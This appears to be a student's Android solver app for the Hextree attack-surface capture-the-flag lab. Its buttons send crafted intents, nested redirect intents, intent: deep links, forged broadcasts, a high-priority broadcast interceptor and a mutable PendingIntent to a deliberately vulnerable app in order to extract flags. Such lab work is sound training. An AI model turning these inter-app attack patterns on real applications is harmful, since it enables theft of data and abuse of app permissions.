package com.sntrain.kribas.hextree1;

import android.Manifest;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainHextreeSolverActivity extends AppCompatActivity {
    int count = 0;
    boolean f18Active = false;
    BroadcastReceiver f18Receiver = null;
    private ActivityResultLauncher<Intent> flag9Launcher =
            registerForActivityResult(
                    new ActivityResultContracts.StartActivityForResult(),
                    result -> {
                        if (result.getResultCode() == -1) {
                            Intent data = result.getData();
                            if (data != null) {
                                String flag = data.getStringExtra("flag");
                                Log.d("FLAG", "Flag is: " + flag);
                            }
                        }
                    }
            );
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        Button homeButton = findViewById(R.id.home_button);

        homeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("MainActivity.onCreate","homeButton.onClick() activated");
                ExecutorService executor = Executors.newSingleThreadExecutor();

                executor.execute(() -> {
                    HttpURLConnection urlConnection = null;

                    try {
                        URL url = new URL("https://www.android.com/");
                        urlConnection = (HttpURLConnection) url.openConnection();

                        InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                        BufferedReader reader = new BufferedReader(new InputStreamReader(in));

                        StringBuilder sb = new StringBuilder();
                        String line;

                        while ((line = reader.readLine()) != null) {
                            sb.append(line).append('\n');
                        }

                        String result = sb.toString();

                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        if (urlConnection != null) {
                            urlConnection.disconnect();
                        }
                    }
                });
            }
        });

        //Flag1Activity
        Button f1 = findViewById(R.id.f1);
        f1.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag1Activity");
            startActivity(intent);
        });

        //Flag2Activity
        Button f2 = findViewById(R.id.f2);
        f2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag2Activity");
                intent.setAction("io.hextree.action.GIVE_FLAG");
                startActivity(intent);
            }
        });

        //Flag3Activity
        Button f3 = findViewById(R.id.f3);
        f3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag3Activity");
                intent.setAction("io.hextree.action.GIVE_FLAG");
                intent.setData(Uri.parse ("https://app.hextree.io/map/android"));
                startActivity(intent);
            }
        });

        //Flag4Activity
        // INIT -> PREPARE -> BUILD -> GET_FLAG
        Button f4 = findViewById(R.id.f4);
        f4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");
                intent.setAction("GET_FLAG_ACTION");
                startActivity(intent);
            }
        });

        //Flag5Activity
        Button f5 = findViewById(R.id.f5);
        f5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
                Intent intent2 = new Intent();
                intent2.putExtra("return",42);
                Intent intent3 = new Intent();
                intent3.putExtra("reason","back");
                intent2.putExtra("nextIntent",intent3);
                intent1.putExtra("android.intent.extra.INTENT",intent2);

                startActivity(intent1);
            }
        });

        //Flag6Activity
        Button f6 = findViewById(R.id.f6);
        f6.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
                Intent intent2 = new Intent();
                intent2.putExtra("return",42);
                Intent intent3 = new Intent();
                intent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");
                intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent3.putExtra("reason","next");
                intent2.putExtra("nextIntent",intent3);
                intent1.putExtra("android.intent.extra.INTENT",intent2);

                startActivity(intent1);
            }
        });

        //Flag7Activity
        Button f7 = findViewById(R.id.f7);
        f7.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag7Activity");
                intent1.setAction("OPEN");
                startActivity(intent1);
            }
        });

        //Flag8Activity
        Button f8 = findViewById(R.id.f8);
        f8.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag8Activity");
                startActivityForResult(intent1,1);
            }
        });


        //Flag9Activity
        Button f9 = findViewById(R.id.f9);
        f9.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag9Activity");
                // startActivityForResult(intent1,9); DEPRECATED
                flag9Launcher.launch(intent);
            }
        });

        //Flag12Activity
        Button f12 = findViewById(R.id.f12);
        f12.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag12Activity");
                intent1.putExtra("LOGIN",true);
                startActivity(intent1);
            }
        });

        //Flag13Activity
        Button f13 = findViewById(R.id.f13);
        f13.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setAction("android.intent.action.VIEW");
                intent1.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href="+Uri.encode("hex://flag?action=give-me")));
                startActivity(intent1);
            }
        });

        //Flag15Activity
        Button f15 = findViewById(R.id.f15);
        f15.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setAction("android.intent.action.VIEW");
                String customIntentDeeplink = Uri.encode("intent:#Intent;"+
                        "package=io.hextree.attacksurface;"+
                        "component=io.hextree.attacksurface/.activities.Flag15Activity;"+
                        "action=io.hextree.action.GIVE_FLAG;" +
                        "category=android.intent.category.BROWSABLE;" +
                        "S.com.android.browser.application_id=com.android.chrome;" +
                        "S.action=flag;" +
                        "B.flag=true;" +
                        "end");
                intent1.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href="+customIntentDeeplink));
                startActivity(intent1);
            }
        });

        //Flag16Activity
        Button f16 = findViewById(R.id.f16);
        f16.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag16Receiver");
                intent1.putExtra("flag","give-flag-16");
                sendBroadcast(intent1);
            }
        });

        //Flag17Activity
        Button f17 = findViewById(R.id.f17);
        f17.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
                intent1.putExtra("flag","give-flag-17");
                sendOrderedBroadcast(intent1,null);
            }
        });

        //Flag18Activity
        Button f18 = findViewById(R.id.f18);
        f18.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (f18Receiver == null){
                    Log.v("Flag18Solver","Creating Receiver");
                    f18Receiver = new Flag18Receiver();
                }
                if (f18Active){
                    //Toggle Receiver off
                    f18Active = false;
                    Log.v("Flag18Solver","Unregistering Receiver");
                    f18.setBackgroundColor(Color.RED);
                    unregisterReceiver(f18Receiver);
                }else {
                    //Toggle Receiver on
                    Log.v("Flag18Solver","Registering Receiver");
                    f18Active = true;
                    f18.setBackgroundColor(Color.GREEN);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        registerReceiver(f18Receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"), Context.RECEIVER_EXPORTED);
                    } else {
                        registerReceiver(f18Receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
                    }
                }
            }
        });

        //Flag19Activity
        Button f19 = findViewById(R.id.f19);
        f19.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag19Solver","Sending broadcast");
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget");
                intent1.setAction("io.hextree.APPWIDGET_UPDATE");
                Bundle bundleExtra = new Bundle();
                bundleExtra.putInt("appWidgetMaxHeight",1094795585);
                bundleExtra.putInt("appWidgetMinHeight",322376503);
                intent1.putExtra("appWidgetOptions",bundleExtra);
                String action = intent1.getAction();
                Log.v("Flag19Solver","Checking pass condition (should be false): "+String.valueOf((action == null || !action.contains("APPWIDGET_UPDATE") || (bundleExtra = intent1.getBundleExtra("appWidgetOptions")) == null) ));
                sendBroadcast(intent1);
            }
        });

        //Flag20Activity
        Button f20 = findViewById(R.id.f20);
        f20.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag20Solver","Button Clicked");
                Log.v("Flag20Solver","Make sure you have clicked the Flag20 Activity on the Hextree App before sending this broadcast");
                Intent intent1 = new Intent();
                intent1.setAction("io.hextree.broadcast.GET_FLAG");
                intent1.putExtra("give-flag",true);
                sendBroadcast(intent1,null);
                Log.v("Flag20Solver","This should solve the challenge but i'm not sure it's the intended way");
            }
        });

        //Flag20Activity
        Button f21 = findViewById(R.id.f21);
        f21.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag21Solver","Button Clicked");
                Log.v("Flag21Solver","Make sure you click the Flag21 notification button on after setting this broadcast receiver");
                IntentFilter filter = new IntentFilter("io.hextree.broadcast.GIVE_FLAG");
                filter.setPriority(1000);
                registerReceiver(new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {
                        String flag = intent.getStringExtra("flag");
                        Log.d("Flag21Solver", "Flag: " + flag);
                    }
                }, filter,RECEIVER_EXPORTED);
                //sendBroadcast(intent1,null);
            }
        });


        //Flag22Activity
        Button f22 = findViewById(R.id.f22);
        f22.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag22Activity");
                Intent intent2 = new Intent();
                intent2.setClassName("com.sntrain.kribas.hextree1","com.sntrain.kribas.hextree1.HextreeReceivingActivity");
                intent2.setAction("io.hextree.attacksurface.ATTACK_ME");
                PendingIntent pending = PendingIntent.getActivity(MainHextreeSolverActivity.this,1337,intent2,PendingIntent.FLAG_MUTABLE);
                intent1.putExtra("PENDING",pending);
                startActivity(intent1);
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        //Flag9Activity
        if (requestCode == 9 && resultCode == -1) {
            if (data != null) {
                String flag = data.getStringExtra("flag");
                Log.d("Flag9", "Flag is: " + flag);
            }
        }
    }

    @Override
    protected void onSaveInstanceState(@NonNull Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putInt("count",count);
        Log.v("MainActivity.onSaveInstanceState", String.format("Saving count: %d", count));
    }

    @Override
    protected void onRestoreInstanceState(@NonNull Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        count = savedInstanceState.getInt("count");
        Log.v("MainActivity.onRestoreInstanceState", String.format("Restoring count: %d", count));
    }
}